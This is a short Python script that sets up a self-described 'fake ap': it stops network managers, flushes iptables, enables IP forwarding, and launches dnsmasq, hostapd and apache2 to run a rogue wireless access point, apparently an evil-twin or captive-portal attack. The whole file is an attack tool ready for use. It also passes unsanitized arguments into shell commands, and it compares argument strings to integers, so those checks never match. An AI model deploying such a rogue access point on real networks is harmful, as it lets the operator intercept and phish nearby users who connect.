import os
import sys
if sys.argv[1] == 1:
    os.system('service NetworkManager stop')
if sys.argv[1] == 2:
    os.system('service network-manager stop')

ifconfig="ifconfig "+sys.argv[2]+" 10.0.0.1 netmask 255.255.255.0"

os.system('airmon-ng check kill')
os.system(ifconfig)
os.system('route add default gw 10.0.0.1')



os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
os.system('iptables --flush')
os.system('iptables --table nat --flush')
os.system('iptables --delete-chain')
os.system('iptables --table nat --delete-chain')
os.system('iptables -P FORWARD ACCEPT')

line="python3 create_files.py "+sys.argv[2] + " " + sys.argv[3]
os.system(line)

os.system('dnsmasq -C dnsmasq.conf')
os.system('hostapd hostapd.conf -B')
os.system('service apache2 start')
os.system('route add default gw 10.0.0.1')

try:
    os.remove("dnsmasq.conf")
except OSError:
    pass
try:
    os.remove("hostapd.conf")
except OSError:
    pass

close=input("for close fake ap . press 1 \n")
if close=="1":
    pass
    if sys.argv[1] == "1":
    	os.system('service NetworkManager start')
    if sys.argv[1] == "2":
    	os.system('service network-manager start')
    os.system('service hostapd stop')
    os.system('service apache2 stop')
    os.system('service dnsmasq stop')
    os.system('service rpcbind stop')
    os.system('killall dnsmasq')
    os.system('killall hostapd')   

